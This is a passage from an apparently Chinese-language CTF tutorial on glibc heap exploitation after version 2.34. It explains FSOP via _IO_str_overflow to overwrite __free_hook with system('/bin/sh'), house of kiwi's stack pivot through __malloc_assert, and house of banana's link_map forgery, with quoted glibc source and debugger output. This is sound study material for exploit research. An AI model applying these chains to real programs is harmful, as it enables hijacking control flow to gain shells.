class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_str_overflow (FILE *fp, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; flush_only = c == EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_flags &amp;amp; _IO_NO_WRITES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; flush_only ? &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; : EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((fp-&amp;gt;_flags &amp;amp; _IO_TIED_PUT_GET) &amp;amp;&amp;amp; !(fp-&amp;gt;_flags &amp;amp; _IO_CURRENTLY_PUTTING))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      fp-&amp;gt;_flags |= _IO_CURRENTLY_PUTTING;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      fp-&amp;gt;_IO_write_ptr = fp-&amp;gt;_IO_read_ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      fp-&amp;gt;_IO_read_ptr = fp-&amp;gt;_IO_read_end;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pos = fp-&amp;gt;_IO_write_ptr - fp-&amp;gt;_IO_write_base;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (pos &amp;gt;= (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;) (_IO_blen (fp) + flush_only))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_flags &amp;amp; _IO_USER_BUF) &lt;span class=&#34;comment&#34;&gt;/* not allowed to enlarge */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *new_buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *old_buf = fp-&amp;gt;_IO_buf_base;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; old_blen = _IO_blen (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; new_size = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * old_blen + &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (new_size &amp;lt; old_blen)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  new_buf = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt; (new_size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (new_buf == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;comment&#34;&gt;/*	  __ferror(fp) = 1; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (old_buf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt; (new_buf, old_buf, old_blen);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt; (old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;comment&#34;&gt;/* Make sure _IO_setb won&amp;#x27;t try to delete _IO_buf_base. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      fp-&amp;gt;_IO_buf_base = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt; (new_buf + old_blen, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\0&amp;#x27;&lt;/span&gt;, new_size - old_blen);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  _IO_setb (fp, new_buf, new_buf + new_size, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_read_base = new_buf + (fp-&amp;gt;_IO_read_base - old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_read_ptr = new_buf + (fp-&amp;gt;_IO_read_ptr - old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_read_end = new_buf + (fp-&amp;gt;_IO_read_end - old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_write_ptr = new_buf + (fp-&amp;gt;_IO_write_ptr - old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_write_base = new_buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_write_end = fp-&amp;gt;_IO_buf_end;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!flush_only)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *fp-&amp;gt;_IO_write_ptr++ = (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;) c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_IO_read_end)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fp-&amp;gt;_IO_read_end = fp-&amp;gt;_IO_write_ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	2.34 前的版本中，我们在利用 FSOP 劫持_IO_list_all 的值来伪造链表和其中的 IO_FILE 项。&lt;/p&gt;
&lt;p&gt;​	当程序执行 exit 函数，或者从 main 函数返回时，会执行调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。&lt;br&gt;
因而当设置 stdout 对应的_IO_FILE 对应的 vtable 为 _IO_str_jumps&lt;br&gt;
 执行 exit 就会执行，_IO_str_overflow,&lt;/p&gt;
&lt;p&gt;利用思路是根据这里面连续的 malloc,memcpy,free，通过控制、伪造 IO_FILE，我们要伪造一个 fake_chunk, 使得函数调用 malloc 时可以得到 fake_chunk, 然后再 fake_chunk 写入我们的数据（来自_IO_buf_base），一般我们把 free_hook 作为 fake_chunk 进行攻击，(这也是攻击陈工的前提)，将 free_hook 覆盖为 system, 执行 system (&amp;quot;/bin/sh&amp;quot;). 这里我们布置的时 fake_chunk 的用户区域为 free_hook-0x10, 这样，_IO_buf_base 的前 8 字节为”/bin/sh\x00“, 接下来的 8 字节时 system 的地址，这样 free (fake_chunk) ===&amp;gt;system (fakechunk), 完成了 free_hook 的覆盖以及 getshell。&lt;/p&gt;
&lt;h4 id=&#34;house-of-kiwi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#house-of-kiwi&#34;&gt;#&lt;/a&gt; house of kiwi&lt;/h4&gt;
&lt;p&gt;当程序没有显示调用 exit，也不会通过主函数返回，那么以往我们使用的 FSOP 就无法进行了，如果此时两个 hook 也没法利用，我们需要一种能够稳定触发 IO 中函数的路径，这就是 house of kiwi, 它利用了__malloc_assert.&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__malloc_assert (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *assertion, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *file, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; line,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		 &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *function)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;) __fxprintf (&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;%s%s%s:%u: %s%sAssertion `%s&amp;#x27; failed.\n&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		     __progname, __progname[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ? &lt;span class=&#34;string&#34;&gt;&amp;quot;: &amp;quot;&lt;/span&gt; : &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		     file, line,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		     function ? function : &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, function ? &lt;span class=&#34;string&#34;&gt;&amp;quot;: &amp;quot;&lt;/span&gt; : &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		     assertion);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fflush (&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;abort&lt;/span&gt; ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从源码中可以看到这个断言中调用了 fflush (stderr)，这个函数会稳定的调用_IO_file_jumps 中的 sync&lt;br&gt;
 在 house of kiwi 中，如果我们能实现一个任意地址写，那么就可以修改 sync 指针，并且在调用的时候还发现，rdx 也很稳定的是 IO_helper_jumps，此时如果我们通过任意地址写将 sync 指针改成 IO_helper_jumps，且将 IO_helper_jumps+0xa0 和 IO_helper_jumps+0xa8 改写，就可以实现栈迁移 orw。在更新的版本中，相关的虚表已经不可以写了。&lt;/p&gt;
&lt;h4 id=&#34;小结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#小结&#34;&gt;#&lt;/a&gt; 小结：&lt;/h4&gt;
&lt;p&gt;但是这些 2.34 更新的版本中（比如 glibcubuntu3.2）下都失效了，因为没有了 free_hook，也就没有了上述的一系列手法，而且以上依赖 fflush () 函数，通常我们需要利用 exit 函数来执行该调用。到此我们宣告上述利用手法，失效。但是比赛目前还没有变态到这种程度，常见的还是 2.34 的早期版本上述手法部分依旧可以实现。&lt;/p&gt;
&lt;h2 id=&#34;解决方案&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解决方案&#34;&gt;#&lt;/a&gt; 解决方案&lt;/h2&gt;
&lt;p&gt;难道 pwn 到此就结束了吗？我们回头梳理下，以上攻击方式失败的原因，无外乎就是没有了 hook 函数以及 vtable 不可写。但是我们回到最开始学习 pwn，其实最简单的还是 rop, 在高版本中我们是否可以结合 stack 与 heap 的攻击？或者我们是否还有其他的办法劫持程序的控制流？&lt;/p&gt;
&lt;h3 id=&#34;house-of-banana&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#house-of-banana&#34;&gt;#&lt;/a&gt; house of banana&lt;/h3&gt;
&lt;p&gt;house of banana 是 ha1vk 师傅在 2020 年总结出来的利用链。不同于_IO_IO_str   和_overflow,_IO_str_overflow。banana 攻击的是 rtld_global 结构体中的 link_map 指针，&lt;/p&gt;
&lt;p&gt;攻击的位置 houm 是在程序结束后调用 exit，或者程序由 libc_start_main 启动，并且主函数可以正常结束返回。（这里提到了 exit，不得不提一下以往的攻击 exit_hook，配合 onegadget 获得 shell，目前为止，到 glibc2.34ubuntu3 依旧可以利用，但是在 3.2 版本下该地址没有了可写权限，所以失效了）&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//2.34 0ubuntu3.2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RAX  &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RBX  &lt;span class=&#34;number&#34;&gt;0x7ffff7fad9f8&lt;/span&gt; (__elf_set___libc_atexit_element__IO_cleanup__) —▸ &lt;span class=&#34;number&#34;&gt;0x7ffff7e26b10&lt;/span&gt; (_IO_cleanup) ◂— endbr64 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RCX  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDX  &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDI  &lt;span class=&#34;number&#34;&gt;0x555555558148&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7ffff7ddd58f&lt;/span&gt; &amp;lt;__run_exit_handlers+&lt;span class=&#34;number&#34;&gt;431&lt;/span&gt;&amp;gt;    nop    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► &lt;span class=&#34;number&#34;&gt;0x7ffff7ddd590&lt;/span&gt; &amp;lt;__run_exit_handlers+&lt;span class=&#34;number&#34;&gt;432&lt;/span&gt;&amp;gt;    call   qword ptr [rbx]               &amp;lt;_IO_cleanup&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rdi: &lt;span class=&#34;number&#34;&gt;0x555555558148&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rsi: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rdx: &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rcx: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; vmmap &lt;span class=&#34;number&#34;&gt;0x7ffff7fad9f8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;number&#34;&gt;0x7ffff7fad000&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;0x7ffff7fb1000&lt;/span&gt; r--p     &lt;span class=&#34;number&#34;&gt;4000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;214000&lt;/span&gt; /usr/lib/x86_64-linux-gnu/libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt; +&lt;span class=&#34;number&#34;&gt;0x9f8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x &lt;span class=&#34;number&#34;&gt;0x7ffff7fad9f8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7ffff7fad9f8&lt;/span&gt; &amp;lt;__elf_set___libc_atexit_element__IO_cleanup__&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xf7e26b10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;house of banana 相较于以往的攻击手法，其实思路很明确。在程序通过显式调用 exit，或者 main 函数是由__libc_start_main 唤起，并可以正常的返回时，由于动态链接的加载机制，程序中并没有 exit 函数的真实调用，而是要通过符号表来获得真实的函数地址。（有关动态链接延迟绑定的技术，还请自行查阅，这里不做过多的阐述。）我们联想到 ret2_dl_resolve 技术。&lt;/p&gt;
&lt;p&gt;下面是 exit 执行的一个过程&lt;/p&gt;
&lt;h5 id=&#34;exit-_dl_fini-fini_t-arrayi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exit-_dl_fini-fini_t-arrayi&#34;&gt;#&lt;/a&gt; exit -&amp;gt; _dl_fini -&amp;gt;((fini_t) array[i]) ();&lt;/h5&gt;
&lt;p&gt;​		banana 手法，通过伪造修改相关的表项，以达到调用后门来获得权限。这里我们重点说一下，在 ubuntu3.2 下利用的可行性。大多数师傅对于 banana 的攻击方式主要有两种，一是攻击_rtld_global 这个全局符号所保存的 link_map 的链表。伪造整个链表，进行劫持。相关的全局变量是可以写的。后面会解释这个变量的用处。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;p3.png&#34; alt=&#34;p3&#34;&gt;&lt;/p&gt;
&lt;p&gt;另外一个与之相比破坏性比较小，更容易成功。由于 link_map 通过链表链接，但是在加载 exit 的时候，相关函数智慧通过 link_map-&amp;gt;l_next 指针进行相关的检查。我们可以在某个特定的位置，更改 next 指针，将下一以链表节点转为我们控制的地方，比如 heap 上。&lt;/p&gt;
&lt;p&gt;​	很多朋友看了上面的可能会比较蒙，下面我具体说一参数。&lt;/p&gt;
&lt;p&gt;关于 link_map, 我们攻击 exit 时，会使用到一个 link_map 的链表，链表的一些信息保存在 struct rtld_global 结构体中，这个结构体信息很多，很繁杂，但是 banana 只用到了几个关键的点。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span 